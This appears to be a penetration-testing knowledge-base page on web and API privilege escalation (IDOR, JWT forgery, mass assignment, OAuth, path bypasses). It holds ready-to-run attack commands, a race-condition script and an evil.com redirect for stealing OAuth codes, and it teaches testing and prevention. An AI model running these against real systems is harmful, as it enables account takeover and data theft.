---
title: Privilege Escalation
---

# Privilege Escalation (Horizontal & Vertical)

Privilege Escalation is a web and API vulnerability that occurs when an application fails to properly enforce authorization, allowing users to access resources or perform actions beyond their intended permissions. Attackers exploit these flaws to steal data, take over accounts, perform unauthorized actions, and gain administrative control.

---

## Understanding Privilege Escalation

**Privilege Escalation** happens when a user obtains access to more resources or functionality than they are normally allowed. The application grants elevated capabilities that should have been prevented by its authorization logic.

**Vertical Privilege Escalation (Elevation of Privilege)**

A lower-privileged user gains access to functionality reserved for higher-privileged users. A regular user becomes an admin, a viewer becomes an editor, a customer deletes other users' accounts.

**Horizontal Privilege Escalation (Broken Object-Level Authorization)**

A user accesses resources or data belonging to another user at the same privilege level. User A reads User B's messages, invoices, or medical records.

**Horizontal-to-Vertical Escalation**

A horizontal escalation that compromises a highly privileged account. Accessing an admin's profile page, resetting their password, and taking over their account turns horizontal access into full vertical escalation.

**Context-Dependent Access Control Bypass**

The application fails to enforce business logic ordering. A user skips step 1 and step 2 of a multi-step process and directly submits the final confirmation, bypassing authorization checks that were only applied to earlier steps.

---

## Types of Privilege Escalation Vulnerabilities

### 1. Insecure Direct Object References (IDOR) / Broken Object-Level Authorization (BOLA)

The application uses user-supplied identifiers (IDs, filenames, GUIDs) to access objects directly without verifying that the authenticated user owns or is authorized to access that object.

**How it works:** The server trusts the client to supply the "right" ID. Changing `?user_id=123` to `?user_id=124` returns another user's data because the backend simply queries `SELECT * FROM users WHERE id = ?` without checking `AND id = session.user_id`.

**Where to look:**

- Path parameters: `/api/users/1234`, `/invoices/2024-00001`
- Query parameters: `?id=42`, `?order=987`, `?account=notmyacct`
- Request body / JSON: `{"user_id": 321}`, `{"lead_id": 64185741}`
- Headers / Cookies: `X-Client-ID: 4711`
- File references: `/download.php?id=55`, `/files/550e8400-e29b-41d4-a716-446655440000`

**What makes IDs exploitable:**

- Sequential integers (auto-increment) — trivially enumerable
- Short alphanumeric patterns (e.g., wristband codes `C-285-100`) — brute-forceable
- UUIDs/GUIDs leaked in other API responses, HTML comments, or user listings
- Base64 or hex-encoded values that look opaque but contain predictable data

### 2. Broken Function-Level Authorization (BFLA)

The application exposes administrative or privileged API endpoints without enforcing role checks. A regular user can call admin-only functions directly.

**How it works:** Admin panel at `/admin/deleteUser` is protected in the UI (the link is hidden) but the endpoint itself has no server-side role check. Any authenticated user who knows the URL can call it.

**Common patterns:**

- Admin endpoints guessable from naming conventions: `/api/admin/users`, `/api/v1/admin/settings`
- Admin URLs disclosed in `robots.txt`, JavaScript bundles, HTML comments, or API documentation
- Mobile app APIs that expose admin functions alongside regular user functions
- GraphQL mutations that accept `role: "admin"` without validation

### 3. Parameter-Based Access Control Manipulation

The application stores role or privilege information in user-controllable locations and trusts it for authorization decisions.

**Controllable locations:**

- Hidden form fields: `<input type="hidden" name="profile" value="SysAdmin">`
- Cookies: `role=user` → change to `role=admin`
- Query parameters: `?admin=true`, `?role=1`
- JWT claims: `{"role": "user"}` → forge to `{"role": "admin"}`

### 4. Mass Assignment / Auto-Binding

The application blindly binds client-submitted fields to internal object properties without a whitelist. An attacker injects extra fields to modify properties they shouldn't control.

**How it works:** Registration form sends `{name, email, password}`. Attacker adds `"role": "admin"` or `"isVerified": true` to the JSON body. If the server framework auto-maps all incoming fields to the database model, the attacker becomes admin on signup.

**Common injectable fields:**

- `role`, `isAdmin`, `isSuperUser`, `permissions`
- `is_verified`, `email_confirmed`, `approved`
- `balance`, `credits`, `plan`, `subscription_tier`
- `org_id`, `tenant_id` (cross-tenant escalation)

### 5. JWT & Token Manipulation

Weak JWT implementations allow attackers to forge tokens, escalate claims, or bypass signature verification entirely.

**Attack vectors:**

- **Algorithm confusion (None attack):** Change `"alg": "HS256"` to `"alg": "none"` and strip the signature
- **Algorithm switching:** Change from RS256 to HS256; use the public key as the HMAC secret
- **Weak secrets:** Brute-force HMAC secrets with `jwt_tool` or `hashcat`
- **Claim tampering:** Modify `role`, `sub`, `admin`, `scope` claims after cracking or bypassing signature
- **Missing expiration:** Token never expires; stolen token grants permanent access
- **JWK injection:** Embed attacker's public key in the token header via `jwk` or `jku`
- **KID manipulation:** Set `kid` header to force the server to use a known/predictable key

### 6. OAuth & SSO Privilege Escalation

Flaws in OAuth flows, SSO integrations, or permission consent screens allow attackers to gain unauthorized access or elevated permissions.

**Attack vectors:**

- **Consent screen manipulation:** OAuth permissions screen shows incorrect/incomplete scopes; user grants more than intended (e.g., X/xAI HackerOne #434763 — DMs readable without permission)
- **Redirect URI manipulation:** Attacker redirects OAuth callback to their server to steal authorization codes
- **Scope escalation:** Request broader scopes than the app is authorized for
- **SSO email confusion:** Register with an email matching an existing SSO account to hijack it
- **GitHub App escalation:** Abuse GitHub app installation permissions to escalate to organization owner (Tanner's $10K bounty)
- **Email confirmation bypass:** Skip email verification during SSO-linked registration to take over shop accounts (Shopify HackerOne #791775)

### 7. Multi-Step Process Bypass

The application enforces authorization only on early steps of a multi-step workflow but not on the final action. An attacker skips directly to the confirmation step.

**How it works:** Admin function to update user details involves: (1) Load form, (2) Submit changes, (3) Review and confirm. Authorization is checked at steps 1 and 2 but not step 3. Attacker directly sends the step 3 request with required parameters.

**Where to look:**

- Payment confirmation endpoints
- Order finalization / checkout completion
- Account deletion confirmation
- Role change approval workflows
- Content publishing / approval actions (e.g., publishing a paid theme without purchasing — Shopify HackerOne #927567)

### 8. Referer-Based Access Control

The application checks the `Referer` header to determine whether a request is authorized. Since the Referer header is fully attacker-controllable, this is trivially bypassed.

**How it works:** `/admin` page has proper auth checks, but sub-pages like `/admin/deleteUser` only verify that the `Referer` header contains `/admin`. Attacker forges the Referer header in a direct request.

### 9. URL & Path Manipulation Bypass

Differences in how the access control layer and the application router interpret URLs create bypass opportunities.

**Bypass techniques:**

- **Case variation:** `/ADMIN/DELETEUSER` vs `/admin/deleteUser`
- **Trailing slash:** `/admin/deleteUser/` vs `/admin/deleteUser`
- **URL encoding:** `/admin%2FdeleteUser`, double encoding `%252F`
- **Path traversal:** `/user/../../admin/deleteUser`
- **Suffix patterns (Spring):** `/admin/deleteUser.anything` maps to `/admin/deleteUser`
- **Header override:** `X-Original-URL: /admin/deleteUser` or `X-Rewrite-URL: /admin/deleteUser` — front-end checks `/` but backend processes the header value
- **HTTP method switching:** Access control blocks `POST /admin/delete` but allows `GET /admin/delete` or `PUT /admin/delete`

### 10. Unprotected Functionality & Admin Panel Exposure

Administrative or privileged functions exist without any access control, relying entirely on the obscurity of the URL.

**Discovery methods:**

- `robots.txt` disclosing admin paths
- JavaScript files containing admin URLs (e.g., `adminPanelTag.setAttribute('href', '/administrator-panel-yb556')`)
- HTML source comments revealing endpoints
- Wordlist brute-forcing with tools like `ffuf`, `gobuster`, `dirbuster`
- API documentation endpoints (`/swagger`, `/api-docs`, `/graphql`)
- Mobile app reverse engineering revealing hidden API routes

### 11. GraphQL Authorization Bypass

GraphQL APIs are particularly sensitive to privilege escalation because a single endpoint handles all operations, and introspection can reveal the entire schema.

**Attack vectors:**

- **Introspection enabled:** Query `{ __schema { queryType { name } } }` to discover all queries, mutations, and types
- **Missing field-level authorization:** Mutation accepts `role`, `isAdmin`, or other privileged fields
- **Nested object access:** Query resolvers that follow relationships without checking authorization at each level
- **Batch queries:** Send multiple operations in one request to bypass rate limiting on authorization checks
- **Alias-based bypass:** Use aliases to query the same field with different arguments in one request

### 12. API Key & Token Scope Escalation

API keys or tokens with excessive permissions, or APIs that don't validate token scope against the requested action.

**Patterns:**

- API key with `read+write+admin` scope issued for a `read-only` integration
- Bearer tokens that grant access to all tenants instead of the issuing tenant
- Service account tokens exposed in client-side code or mobile apps
- Tokens that don't expire or can't be revoked

### 13. Hidden Admin Account & Persistence

Attackers with temporary elevated access create hidden backdoor accounts that survive password resets and permission changes.

**Real-world pattern (Reddit HackerOne #1596663):** Admin creates a hidden admin account that the organization owner cannot detect or remove. The hidden account continues to perform administrative actions even after the original admin's access is revoked.

### 14. Registration & Invitation Flow Abuse

Flaws in user registration, invitation, and onboarding flows allow privilege escalation during account creation.

**Attack vectors:**

- **Role parameter injection at registration:** Adding `role=admin` during signup
- **Invitation link hijacking:** Using an invitation link meant for an admin role with a different email
- **Email domain spoofing:** Registering with an email that matches the organization's domain to auto-assign elevated roles
- **Self-invitation escalation:** Low-privilege user who lacks user management access can still invite other users or remove the business owner (BugBoard reports on restaurant platform)

---

## Attack Surfaces

| **Layer** | **What to Test** |
| --- | --- |
| **API Endpoints** | CRUD operations on all resources; admin/management endpoints; GraphQL queries & mutations |
| **Object References** | IDs in URLs, query params, body, headers, cookies; file download endpoints |
| **Session & Token** | JWT claims, cookie values, hidden fields, session identifiers |
| **Access Control Logic** | Role checks on every endpoint; multi-step workflows; Referer-based controls |
| **URL Routing** | Case sensitivity, trailing slashes, path traversal, header overrides, HTTP method handling |
| **OAuth & SSO** | Consent screens, redirect URIs, scope validation, email verification |
| **Registration & Invitation** | Signup fields, invitation flows, email confirmation, role assignment |
| **GraphQL** | Introspection, mutations, nested resolvers, field-level authorization |
| **File & Resource Access** | File download by ID, document sharing links, media access tokens |
| **Cloud & Infrastructure** | IAM roles, service account permissions, cross-tenant access |

---

## Exploitation and Testing Techniques

### 1. IDOR / BOLA Testing

**What to test:** Whether changing an object identifier in any request lets you access another user's data or perform actions on their behalf.

**Manual — Burp Repeater:**

```jsx
# Capture an authenticated request referencing your own resource
GET /api/users/1234/profile HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION

# Change the ID to another user's
GET /api/users/1235/profile HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
```

**Automated enumeration (curl loop):**

```jsx
for id in $(seq 1000 1100); do
  curl -s "https://target.com/api/orders/$id" \
    -H "Cookie: session=$TOKEN" \
    | jq -e '.email' && echo "IDOR Hit: $id"
done
```

**Automated enumeration (ffuf):**

```jsx
ffuf -u https://target.com/api/users/FUZZ/profile \
  -H "Cookie: session=$TOKEN" \
  -w <(seq 1 5000) \
  -mc 200 \
  -o idor_hits.json
```

**Expected:** Accessing another user's resource should return `403 Forbidden` or `404 Not Found`, never a `200 OK` with their data.

**Tools:** Burp Suite (Authorize extension, Intruder), ffuf, OWASP ZAP (Access Control testing), Auto Repeater.

### 2. Vertical Privilege Escalation

**What to test:** Whether a low-privileged user can access admin-only endpoints and functions.

**Manual — Two-session technique:**

```jsx
# Step 1: Log in as admin, capture request to admin function
POST /admin/deleteUser HTTP/1.1
Cookie: SessionID=ADMIN_SESSION
Content-Type: application/json

{"userId": "victim123"}

# Step 2: Replay the same request with a regular user's session
POST /admin/deleteUser HTTP/1.1
Cookie: SessionID=REGULAR_USER_SESSION
Content-Type: application/json

{"userId": "victim123"}
```

**Admin panel discovery:**

```jsx
# Check robots.txt
curl -s https://target.com/robots.txt

# Check JavaScript for admin URLs
curl -s https://target.com/ | grep -oP '(?:href|src|url)[\s]*[=:]\s*["\x27]([^"\x27]*admin[^"\x27]*)["\x27]'

# Brute-force admin paths
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403
```

**Expected:** Admin endpoints should return `401` or `403` for non-admin users. A `200` or `302` to the admin page content indicates a vulnerability.

### 3. Parameter Manipulation

**What to test:** Whether modifying hidden fields, cookies, or query parameters changes the user's effective role.

**Manual:**

```jsx
# Test cookie-based role
curl -s https://target.com/dashboard \
  -H "Cookie: session=abc123; role=admin"

# Test query parameter role
curl -s "https://target.com/home?admin=true&role=1"

# Test hidden field manipulation (intercept POST in Burp)
POST /profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker&profile=SysAdmin&isAdmin=true
```

### 4. Mass Assignment Testing

**What to test:** Whether the API accepts and processes fields that should not be user-controllable.

**Manual:**

```jsx
# Normal registration
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","password":"Pass123!"}'

# Mass assignment attempt — inject role
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","password":"Pass123!","role":"admin","isVerified":true}'

# Mass assignment on profile update
curl -X PATCH https://target.com/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","permissions":["read","write","delete","admin"]}'
```

**GraphQL mass assignment:**

```jsx
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "query": "mutation UpdateUser($input: UpdateUserInput!) { updateUser(input: $input) { id role } }",
    "variables": {
      "input": {
        "id": "myUserId",
        "role": "admin",
        "isSuperUser": true
      }
    }
  }'
```

**Expected:** Extra fields should be silently ignored or explicitly rejected. If the response confirms the role change, it's vulnerable.

### 5. JWT Manipulation

**What to test:** Whether JWTs can be forged, tampered with, or have their signature verification bypassed.

**Manual — Decode and inspect:**

```jsx
# Decode JWT (base64)
echo "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.signature" | cut -d. -f2 | base64 -d 2>/dev/null

# Test algorithm none attack
python3 jwt_tool.py $JWT -X a

# Test weak secret brute-force
python3 jwt_tool.py $JWT -C -d /usr/share/wordlists/rockyou.txt

# Forge token with modified claims
python3 jwt_tool.py $JWT -T -S hs256 -p "secret" -pc role -pv admin
```

**Key confusion attack (RS256 → HS256):**

```jsx
# Get the server's public key
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem

# Sign a forged JWT using the public key as HMAC secret
python3 jwt_tool.py $JWT -X k -pk pubkey.pem
```

**Tools:** jwt_tool, jwt.io, hashcat (`-m 16500`), Burp JWT Editor extension.

### 6. HTTP Method & Header Bypass

**What to test:** Whether changing the HTTP method or adding override headers bypasses access controls.

**Manual:**

```jsx
# Method switching
curl -X GET https://target.com/admin/deleteUser?userId=123 \
  -H "Cookie: session=$USER_SESSION"

curl -X PUT https://target.com/admin/deleteUser \
  -H "Cookie: session=$USER_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"userId": "123"}'

# Header-based URL override
curl -X POST https://target.com/ \
  -H "X-Original-URL: /admin/deleteUser" \
  -H "Cookie: session=$USER_SESSION" \
  -d 'userId=123'

curl -X GET https://target.com/ \
  -H "X-Rewrite-URL: /admin/settings" \
  -H "Cookie: session=$USER_SESSION"
```

### 7. URL Path Bypass

**What to test:** Whether URL manipulation circumvents path-based access control.

**Manual:**

```jsx
# Case variation
curl -s https://target.com/ADMIN/SETTINGS -H "Cookie: session=$TOKEN"

# Trailing slash
curl -s https://target.com/admin/deleteUser/ -H "Cookie: session=$TOKEN"

# Double URL encoding
curl -s "https://target.com/admin%252FdeleteUser" -H "Cookie: session=$TOKEN"

# Path traversal
curl -s "https://target.com/user/../admin/settings" -H "Cookie: session=$TOKEN"

# Semicolon path parameter (Tomcat/Java)
curl -s "https://target.com/admin;/deleteUser" -H "Cookie: session=$TOKEN"

# Null byte (legacy)
curl -s "https://target.com/admin%00/deleteUser" -H "Cookie: session=$TOKEN"

# Spring suffix pattern
curl -s "https://target.com/admin/deleteUser.json" -H "Cookie: session=$TOKEN"
curl -s "https://target.com/admin/deleteUser.css" -H "Cookie: session=$TOKEN"
```

### 8. Multi-Step Process Bypass

**What to test:** Whether skipping earlier steps of a multi-step process bypasses authorization on the final step.

**Manual:**

```jsx
# Identify a multi-step admin action (e.g., user role change)
# Step 1: GET /admin/users/123/edit (loads form)
# Step 2: POST /admin/users/123/update (submits changes)
# Step 3: POST /admin/users/123/confirm (confirms changes)

# Skip steps 1 and 2, directly hit step 3
curl -X POST https://target.com/admin/users/123/confirm \
  -H "Cookie: session=$REGULAR_USER_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"action": "changeRole", "newRole": "admin"}'
```

### 9. GraphQL Introspection & Authorization Testing

**What to test:** Whether introspection reveals privileged operations and whether field-level authorization is enforced.

**Manual:**

```jsx
# Check if introspection is enabled
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name fields { name } } } }"}'

# Enumerate mutations
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'

# Attempt privileged mutation as low-privilege user
curl -s -X POST https://target.com/graphql \
  -H "Authorization: Bearer $LOW_PRIV_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: \"admin123\") { success } }"}'
```

**Tools:** Burp Suite, GraphQL Voyager, InQL (Burp extension), Altair GraphQL Client.

### 10. OAuth & SSO Testing

**What to test:** Whether OAuth scopes, consent screens, redirect URIs, and SSO flows can be manipulated for privilege escalation.

**Manual:**

```jsx
# Test scope escalation
# Normal auth URL:
https://auth.target.com/authorize?client_id=APP&scope=read&redirect_uri=https://app.com/callback

# Escalated scope:
https://auth.target.com/authorize?client_id=APP&scope=read+write+admin&redirect_uri=https://app.com/callback

# Test redirect URI manipulation
https://auth.target.com/authorize?client_id=APP&scope=read&redirect_uri=https://evil.com/callback

# Test SSO email confusion
# Register a non-SSO account with an email that matches an existing SSO user
```

### 11. Race Condition Privilege Escalation

**What to test:** Whether sending concurrent requests to role-changing or verification endpoints can bypass checks.

**Manual (Burp Turbo Intruder):**

```jsx
# Turbo Intruder script for race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
requestsPerConnection=1,
                          pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

### 12. Invitation & Registration Abuse

**What to test:** Whether invitation flows, registration endpoints, or account creation APIs allow role manipulation.

**Manual:**

```jsx
# Intercept invitation acceptance and modify role
POST /api/invitations/accept HTTP/1.1
Content-Type: application/json

{"invitationToken": "abc123", "role": "admin"}

# Test self-invitation (user without user-management access)
POST /api/invitations HTTP/1.1
Authorization: Bearer $LOW_PRIV_TOKEN
Content-Type: application/json

{"email": "attacker@evil.com", "role": "owner"}
```

### 13. IP-Based Access Control Bypass

**What to test:** Whether IP-based restrictions can be bypassed with header manipulation.

**Manual:**

```jsx
curl -s https://target.com/admin \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "X-Remote-IP: 127.0.0.1" \
  -H "X-Client-IP: 127.0.0.1" \
  -H "Cookie: session=$TOKEN"
```

### 14. Referer-Based Access Control Bypass

**What to test:** Whether forging the Referer header grants access to restricted sub-pages.

**Manual:**

```jsx
# Admin sub-page checks Referer for /admin
curl -s https://target.com/admin/deleteUser \
  -H "Referer: https://target.com/admin" \
  -H "Cookie: session=$REGULAR_USER_SESSION" \
  -d "userId=victim123"
```

---

**Advanced Attack Scenarios
1. IDOR + XSS → Account Takeover**
**Flow:** Discover IDOR on `/api/users/{id}/settings` that returns API keys → find stored XSS on the platform → XSS payload fetches victim's API key via IDOR → attacker takes over victim's account using the API key.
**Takeaway:** IDOR on sensitive fields (tokens, keys, password hashes) combined with any code execution vulnerability escalates to full account takeover.
**2. Email Confirmation Bypass + SSO → Shop Owner Takeover**
**Flow:** Application uses SSO via `myshopify.com`. Attacker bypasses email confirmation during linked account creation → now authenticated as the shop owner via SSO without ever confirming email ownership
**Takeaway:** Email verification bypasses in SSO-linked flows can grant instant access to any linked account.
**3. OAuth Scope Confusion → Read Private DMs**
**Flow:** OAuth permissions screen incorrectly displays granted permissions. Application requests DM read access but the consent screen doesn't show it → user authorizes → attacker's app reads private DMs 
**Takeaway:** Always verify that OAuth consent screens accurately reflect the actual scopes being granted.
**4. GitHub App Installation → Organization Owner Escalation**
**Flow:** Attacker creates a GitHub App with specific installation permissions → tricks org admin into installing it → app leverages installation token to escalate attacker's role to organization owner.
**Takeaway:** Third-party app installations in organizational contexts can cascade into full administrative takeover.
**5. Stored XSS + File Upload → Workspace Takeover**
**Flow:** Application allows file upload with insufficient content validation → attacker uploads SVG/HTML with stored XSS payload → when admin views the file, XSS executes in their context → script modifies workspace settings, adds attacker as admin → full workspace takeover.
**Takeaway:** XSS in admin-viewable contexts (file previews, comments, notifications) is particularly dangerous because it inherits the admin's privileges.
**6. Mass Assignment + Registration → Instant Admin**
**Flow:** User registration endpoint auto-maps all JSON fields to the user model → attacker adds `"role": "admin"` to the registration request → account created with admin privileges → immediate full control.
**Takeaway:** Mass assignment during registration is the fastest path from zero to admin.
**7. Hidden Admin Account → Persistent Backdoor**
**Flow:** Attacker gains temporary admin access (via any escalation method) → creates a hidden admin account that doesn't appear in user management listing → original vulnerability is patched but the hidden account persists → attacker maintains permanent admin access.
**Takeaway:** Post-exploitation persistence through hidden accounts can survive vulnerability remediation.
**8. IDOR on Translation/Content Approval → Content Manipulation**
**Flow:** User discovers that the `/translations/unapprove/` endpoint doesn't validate the caller's role → any authenticated user can unapprove any approved translation → attacker systematically unapproves legitimate content or approves malicious translations .
**Takeaway:** Content moderation actions (approve, reject, publish, pin, unpin) are frequently missing authorization checks.
**9. AWS Lambda/CloudFront Extension → Cloud Privilege Escalation**
**Flow:** Misconfigured AWS Lambda or CloudFront extension grants overly permissive IAM role → service can access secrets, modify S3 buckets, or assume roles across accounts → lateral movement to other cloud services.
**Takeaway:** Cloud service misconfigurations that grant excessive IAM permissions create privilege escalation paths from the web layer to the cloud infrastructure

---

## **Detection Techniques**

### **Manual**

• **Proxy (Burp Suite / ZAP):** Intercept all requests, swap session tokens between users of different roles, observe responses
• **Browser DevTools:** Inspect cookies, hidden fields, localStorage/sessionStorage for role data
• **Two-browser technique:** Log in as admin in one browser, regular user in another; replay admin requests with user's cookies
• **API documentation review:** Compare documented endpoints against role-specific access
• **JavaScript source analysis:** Search for admin URLs, hidden endpoints, role checks in client-side code

### **Automated**

• **Burp Authorize extension:** Automatically replays every request with a lower-privileged session and compares responses
• **Burp Auto Repeater:** Automatically duplicates requests with modified headers/parameters
• **OWASP ZAP Access Control:** Map application with different user roles, compare access matrices
• **Nuclei templates:** `nuclei -u https://target.com -tags auth,idor,privilege-escalation`
• **Arjun:** Discover hidden parameters that might influence authorization
• **ParamSpider / GAP:** Extract parameters from JavaScript files for testing
• **jwt_tool:** Automated JWT vulnerability scanning
• **Autorize:** Burp extension for automated authorization testing

---

## Tools

| **Category** | **Tool** | **Purpose** |
| --- | --- | --- |
| **Authorization Testing** | Burp Authorize,Burp Auto Repeater,OWASP ZAP | Automated authorization bypass detection |
| **IDOR Scanning** | Burp Intruder,ffuf,Autorize | Sequential ID enumeration.
Fast parameter fuzzing and ID enumeration.
Automated BOLA/IDOR detection. |
| **JWT Testing** | hashcat (-m 16500) | JWT vulnerability scanner (none alg, weak secret, claim tampering).
JWT HMAC secret brute-forcing |
| **GraphQL** | InQL (Burp) | GraphQL introspection and query generation |
| **GraphQL** | Altair | Visual schema exploration.
GraphQL client for manual testing |
| **Parameter Discovery** | Arjun,ParamSpider | Hidden parameter finder.
Parameter extraction from web archives |
| **Endpoint Discovery** | ffuf / gobuster,dirsearch | Admin panel and hidden path brute-forcing.
Web path scanner |
| **General Scanners** | Nikto | Template-based authorization and misconfig checks.
Web server vulnerability scanner |
| **Race Conditions** | Turbo Intruder | Concurrent request sending for race conditions |
| **API Testing** | Postman / Insomnia | API request crafting and collection management |

---

## Impact

- **Account Takeover:** Full compromise of victim accounts via credential theft or horizontal IDOR.
- **Data Breach:** Mass exfiltration of sensitive information through bulk enumeration and unauthorized access.
- **Unauthorized Admin Access:** Low-level users gaining the ability to manage system users, settings, and core configurations.
- **Financial Fraud:** Bypassing payment gateways, altering transactions, or accessing private financial records.
- **Content Manipulation:** Illegitimate publishing, approval, or alteration of digital content and user data.
- **Persistent Backdoors:** The creation of hidden administrative accounts that evade detection and survive patching.
- **Cloud Compromise:** Escalating from web-layer vulnerabilities to full infrastructure takeover via abused IAM roles.
- **Compliance Violations:** Security breaches resulting in severe regulatory penalties (e.g., GDPR, HIPAA, PCI-DSS).
- **Reputation Damage:** Significant loss of customer trust and brand value due to publicized authorization failures.
- **Business Logic Abuse:** Exploiting application workflows to access paid features for free or bypass mandatory approvals.

---

## **Prevention Techniques**

### **Architecture & Design**

• **Deny by default:** Unless a resource is explicitly public, deny all access and require explicit grants
• **Use indirect references:** Map user-facing IDs to internal IDs via a per-session mapping table; never expose database primary keys directly

### **Implementation**

• **Server-side Validation:** All authorization decisions must be made server-side; never trust client-side role indicators (cookies, hidden fields, JWTs without server validation)
• **Strong JWT implementation:** Use RS256 with proper key management; validate `alg` header against a whitelist; enforce short expiration; implement token revocation
• **Object-level authorization:** On every CRUD operation, verify the authenticated user's relationship to the object being accessed

### **Testing & Operations**

• **Automated authorization testing:** Include authorization matrix tests in CI/CD pipelines
• **Rate limiting and logging:** Rate-limit sensitive endpoints; log all authorization failures and alert on patterns (sequential ID enumeration, repeated 403s)
• **Session management:** Invalidate sessions on logout; rotate session tokens on privilege changes; 

---

## **Good to Read**

• [Shopify — Email Confirmation Bypass → Full Shop Owner Takeover (HackerOne #791775)](https://hackerone.com/reports/791775) — SSO-linked email bypass for complete privilege escalation to shop owner.
• [Shopify — Publish Paid Theme Without Purchase (HackerOne #927567)](https://hackerone.com/reports/927567) — Business logic bypass allowing unpaid theme deployment.
• [X/xAI — OAuth DM Access Without Permission (HackerOne #434763)](https://hackerone.com/reports/434763) — Consent screen misrepresentation granting unauthorized DM read.
• [Reddit — Hidden Admin Account Persistence (HackerOne #1596663)](https://hackerone.com/reports/1596663) — Invisible admin account that survives owner review.
• [Automattic — Privilege Escalation (HackerOne #13959)](https://hackerone.com/reports/13959) — Early classic privilege escalation report.
• [GitHub App to Organization Owner Escalation ($10K bounty)](https://medium.com/@0xtanner/using-a-github-app-to-escalate-to-an-organization-owner-for-a-10-000-bounty) — GitHub App installation exploit leading to org owner.
• [Partners Portal Admin Access — Youssef Sammouda](https://samcurry.net/privilege-escalation-in-partners-portal-to-admin-access) — Partner portal authorization bypass.

• [OWASP WSTG — Testing for Privilege Escalation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation) — Test methodology and examples.
• [OWASP — Mass Assignment](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment)
• [PortSwigger — Access Control Vulnerabilities and Privilege Escalation](https://portswigger.net/web-security/access-control) — Comprehensive guide with labs.
• [PortSwigger — JWT Attacks](https://portswigger.net/web-security/jwt) — JWT vulnerability guide.
• [PortSwigger — OAuth Authentication Vulnerabilities](https://portswigger.net/web-security/oauth) — OAuth exploitation techniques.
• [HackTricks — IDOR (Insecure Direct Object Reference)](https://book.hacktricks.wiki/en/pentesting-web/idor.html) — Practical IDOR testing methodology.
• [HackTricks — Registration & Takeover Vulnerabilities](https://book.hacktricks.wiki/en/pentesting-web/registration-vulnerabilities.html) — Signup flow exploitation.
• [CrowdStrike — Privilege Escalation Prevention Guide (2022)](https://www.crowdstrike.com/cybersecurity-101/privilege-escalation/) 
• [SecureFlag — Privilege Escalation Knowledge Base](https://knowledge-base.secureflag.com/vulnerabilities/broken_access_control/privilege_escalation.html) — Educational resource with code examples.

---

## **References**

• [https://owasp.org/Top10/A01_2021-Broken_Access_Control/](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
• [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/)
• [https://portswigger.net/web-security/access-control](https://portswigger.net/web-security/access-control)
• [https://portswigger.net/web-security/access-control/idor](https://portswigger.net/web-security/access-control/idor)
• [https://portswigger.net/web-security/jwt](https://portswigger.net/web-security/jwt)
• [https://portswigger.net/web-security/oauth](https://portswigger.net/web-security/oauth)
• [https://book.hacktricks.wiki/en/pentesting-web/idor.html](https://book.hacktricks.wiki/en/pentesting-web/idor.html)
• [https://book.hacktricks.wiki/en/pentesting-web/registration-vulnerabilities.html](https://book.hacktricks.wiki/en/pentesting-web/registration-vulnerabilities.html)
• [https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
• [https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
• [https://www.crowdstrike.com/cybersecurity-101/privilege-escalation/](https://www.crowdstrike.com/cybersecurity-101/privilege-escalation/)